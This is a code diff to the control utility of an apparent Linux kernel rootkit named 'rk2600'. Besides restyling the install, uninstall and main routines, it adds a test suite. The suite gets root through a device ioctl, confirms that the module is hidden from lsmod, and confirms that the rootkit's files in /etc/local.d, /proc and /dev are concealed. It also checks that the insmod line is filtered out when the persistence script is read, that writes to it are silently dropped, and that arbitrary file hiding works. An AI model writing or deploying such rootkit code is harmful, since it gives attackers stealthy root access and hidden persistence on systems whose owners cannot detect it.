@@ -292,17 +292,21 @@ static int cmd_install(const char *ko_path)
 			RK2600_PERSIST_PATH, strerror(errno));
 	printf("Persistence: %s\n", RK2600_PERSIST_PATH);
 
-	/* Ensure the local service is enabled for persistence */
-	char *rcupdate_argv[] = {"rc-update", "add", "local", "default", NULL};
-
-	spawn(rcupdate_argv);
+	{
+		char *rcupdate_argv[] = {
+			"rc-update", "add", "local", "default", NULL
+		};
+		spawn(rcupdate_argv);
+	}
 
 	printf("Loading module...\n");
-	char *insmod_argv[] = {"insmod", dest, NULL};
+	{
+		char *insmod_argv[] = {"insmod", dest, NULL};
 
-	if (spawn(insmod_argv) < 0)
-		fprintf(stderr,
-			"Warning: insmod failed (already loaded?).\n");
+		if (spawn(insmod_argv) < 0)
+			fprintf(stderr,
+				"Warning: insmod failed (already loaded?).\n");
+	}
 
 	printf("Installed.\n");
 	return 0;
@@ -326,11 +330,13 @@ static int cmd_uninstall(void)
 		close(fd);
 	}
 
-	char *rmmod_argv[] = {"rmmod", RK2600_MODULE_NAME, NULL};
+	{
+		char *rmmod_argv[] = {"rmmod", RK2600_MODULE_NAME, NULL};
 
-	if (spawn(rmmod_argv) < 0)
-		fprintf(stderr,
-			"Warning: rmmod failed (module not loaded?).\n");
+		if (spawn(rmmod_argv) < 0)
+			fprintf(stderr,
+				"Warning: rmmod failed (module not loaded?).\n");
+	}
 
 	if (uname(&uts) == 0) {
 		snprintf(dest, sizeof(dest),
@@ -349,6 +355,120 @@ static int cmd_uninstall(void)
 	return 0;
 }
 
+/* ------------------------------------------------------------------- test */
+
+static void run_show(const char *label, const char *cmd)
+{
+	printf("\n[%s]\n$ %s\n", label, cmd);
+	fflush(stdout);
+	system(cmd);
+}
+
+static int run_test(const char *label, const char *cmd, bool expect_fail)
+{
+	int ret;
+	int ok;
+
+	printf("\n[%s]\n$ %s\n", label, cmd);
+	fflush(stdout);
+	ret = system(cmd);
+	ret = WIFEXITED(ret) ? WEXITSTATUS(ret) : 1;
+	ok = expect_fail ? (ret != 0) : (ret == 0);
+	printf("=> %s\n", ok ? "PASS" : "FAIL");
+	return ok ? 0 : 1;
+}
+
+static int cmd_test(const char *self)
+{
+	char cmd[512];
+	int pass = 0;
+	int total = 0;
+	int fd;
+
+	printf("=== rk2600 test suite ===\n");
+
+	/* Privilege escalation — first, to get root for remaining tests */
+	run_show("Privesc: before", "id");
+
+	printf("\n[Privesc: elevate]\n");
+	printf("$ ioctl(%s, RK2600_IOC_ELEVATE)\n", RK2600_DEVICE_PATH);
+	fflush(stdout);
+	total++;
+	fd = open_ctl();
+	if (fd >= 0) {
+		if (ioctl(fd, RK2600_IOC_ELEVATE) == 0 && geteuid() == 0) {
+			printf("=> PASS\n");
+			pass++;
+		} else {
+			printf("=> FAIL\n");
+		}
+		close(fd);
+	} else {
+		printf("=> FAIL\n");
+	}
+
+	run_show("Privesc: after", "id");
+
+	/* Status */
+	snprintf(cmd, sizeof(cmd), "%s status", self);
+	total++; pass += (run_test("Status", cmd, false) == 0);
+
+	/* Module hiding */
+	total++; pass += (run_test("Module hiding",
+		"lsmod | grep rk2600", true) == 0);
+
+	/* File hiding */
+	total++; pass += (run_test("Hide: snd-compat.start",
+		"ls /etc/local.d/ | grep snd-compat", true) == 0);
+
+	total++; pass += (run_test("Hide: /proc/.rk",
+		"ls -a /proc/ | grep '^\\.rk$'", true) == 0);
+
+	total++; pass += (run_test("Hide: /dev/.rk_ctl",
+		"ls -a /dev/ | grep '\\.rk_ctl'", true) == 0);
+
+	/* Direct access (hidden but still accessible) */
+	total++; pass += (run_test("Access: " RK2600_DEVICE_PATH,
+		"test -c " RK2600_DEVICE_PATH, false) == 0);
+
+	total++; pass += (run_test("Access: " RK2600_PROC_PATH,
+		"test -e " RK2600_PROC_PATH, false) == 0);
+
+	/* Read filter */
+	run_show("Read: content", "cat " RK2600_PERSIST_PATH);
+
+	total++; pass += (run_test("Read: insmod filtered",
+		"cat " RK2600_PERSIST_PATH " | grep insmod", true) == 0);
+
+	/* Write stealth */
+	run_show("Write: append",
+		"echo 'RK_TEST_42' >> " RK2600_PERSIST_PATH
+		" && echo '(no error returned)'");
+
+	total++; pass += (run_test("Write: verify dropped",
+		"grep RK_TEST_42 " RK2600_PERSIST_PATH, true) == 0);
+
+	/* Dynamic hide/unhide */
+	system("touch /test_rk_hide 2>/dev/null");
+
+	snprintf(cmd, sizeof(cmd),
+		"%s hide test_rk_hide >/dev/null 2>&1; "
+		"ls / | grep test_rk_hide", self);
+	total++; pass += (run_test("Dynamic hide", cmd, true) == 0);
+
+	snprintf(cmd, sizeof(cmd),
+		"%s unhide test_rk_hide >/dev/null 2>&1; "
+		"ls / | grep test_rk_hide", self);
+	total++; pass += (run_test("Dynamic unhide", cmd, false) == 0);
+
+	system("rm -f /test_rk_hide 2>/dev/null");
+
+	/* Summary */
+	printf("\n=== Results: %d/%d passed ===\n", pass, total);
+
+	return (pass == total) ? 0 : 1;
+}
+
 /* ------------------------------------------------------------------- main */
 
 static void print_usage(FILE *out, const char *prog)
@@ -362,7 +482,8 @@ static void print_usage(FILE *out, const char *prog)
 		"  status         Show module status\n"
 		"  privesc        Elevate to root shell\n"
 		"  hide <name>    Hide a directory entry\n"
-		"  unhide <name>  Reveal a directory entry\n",
+		"  unhide <name>  Reveal a directory entry\n"
+		"  test           Run feature test suite\n",
 		prog);
 }
 
@@ -423,9 +544,11 @@ int main(int argc, char **argv)
 			fprintf(stderr, "install takes at most one argument.\n");
 			return EXIT_USAGE;
 		}
-		const char *ko = (argc == 3) ? argv[2] : "./" RK2600_MODULE_FILE;
-
-		return cmd_install(ko) == 0 ? 0 : 1;
+		{
+			const char *ko = (argc == 3)
+				? argv[2] : "./" RK2600_MODULE_FILE;
+			return cmd_install(ko) == 0 ? 0 : 1;
+		}
 	}
 
 	if (strcmp(cmd, "uninstall") == 0) {
@@ -434,6 +557,14 @@ int main(int argc, char **argv)
 			return EXIT_USAGE;
 		}
 		return cmd_uninstall() == 0 ? 0 : 1;
+	}
+
+	if (strcmp(cmd, "test") == 0) {
+		if (argc != 2) {
+			fprintf(stderr, "test takes no arguments.\n");
+			return EXIT_USAGE;
+		}
+		return cmd_test(argv[0]) == 0 ? 0 : 1;
 	}
 
 	fprintf(stderr, "Unknown command: %s\n", cmd);
